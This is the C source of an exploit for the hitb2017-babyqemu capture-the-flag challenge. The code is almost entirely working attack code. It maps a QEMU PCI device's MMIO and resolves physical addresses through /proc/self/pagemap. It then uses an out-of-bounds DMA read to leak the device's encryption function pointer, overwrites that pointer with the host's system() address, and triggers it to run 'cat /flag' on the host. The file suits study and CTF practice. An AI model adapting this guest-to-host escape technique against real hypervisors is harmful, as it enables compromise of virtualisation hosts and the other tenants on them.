/*
Author: raycp
File: exp.c
Description: exp for hitb2017-babyqemu, out-of-bound access with mmio through dma
Date: 2019-08-06
*/

#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

#define DMABASE 0x40000
char *userbuf;
uint64_t phy_userbuf;
unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

uint64_t page_offset(uint64_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}




void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void dma_set_src(uint32_t src_addr)
{
    mmio_write(0x80,src_addr);
}

void dma_set_dst(uint32_t dst_addr)
{
    mmio_write(0x88,dst_addr);
}

void dma_set_cnt(uint32_t cnt)
{
    mmio_write(0x90,cnt);
}

void dma_do_cmd(uint32_t cmd)
{
    mmio_write(0x98,cmd);
}

void dma_do_write(uint32_t addr, void *buf, size_t len)
{
    assert(len<0x1000);

    memcpy(userbuf,buf,len);

    dma_set_src(phy_userbuf);
    dma_set_dst(addr);
    dma_set_cnt(len);
    dma_do_cmd(0|1);

    sleep(1);

}

void dma_do_read(uint32_t addr, size_t len)
{

    dma_set_dst(phy_userbuf);
    dma_set_src(addr);
    dma_set_cnt(len);

    dma_do_cmd(2|1);

    sleep(1);
}

void dma_do_enc(uint32_t addr,size_t len)
{
    dma_set_src(addr);
    dma_set_cnt(len);

    dma_do_cmd(1|4|2);
}


int main(int argc, char *argv[])
{
    
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    // Allocate DMA buffer and obtain its physical address
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED)
        die("mmap");

    mlock(userbuf, 0x1000);//锁住page，防止被调度
    phy_userbuf=gva_to_gpa(userbuf);
    printf("user buff virtual address: %p\n",userbuf);
    printf("user buff physical address: %p\n",(void*)phy_userbuf);

    // out of bound to leak enc ptr
    dma_do_read(0x1000+DMABASE,8);
    
    uint64_t leak_enc=*(uint64_t*)userbuf;
    printf("leaking enc function: %p\n",(void*)leak_enc);

    uint64_t pro_base=leak_enc-0x283DD0;
    uint64_t system_plt=pro_base+0x1FDB18;
    
    // out of bound to overwrite enc ptr to system ptr
    dma_do_write(0x1000+DMABASE,&system_plt,8);

    // deply the parameter of system function
    char *command="cat /flag\x00";
    dma_do_write(DMABASE,command,strlen(command));

    // trigger the enc ptr to execute system
    dma_do_enc(DMABASE,8);


}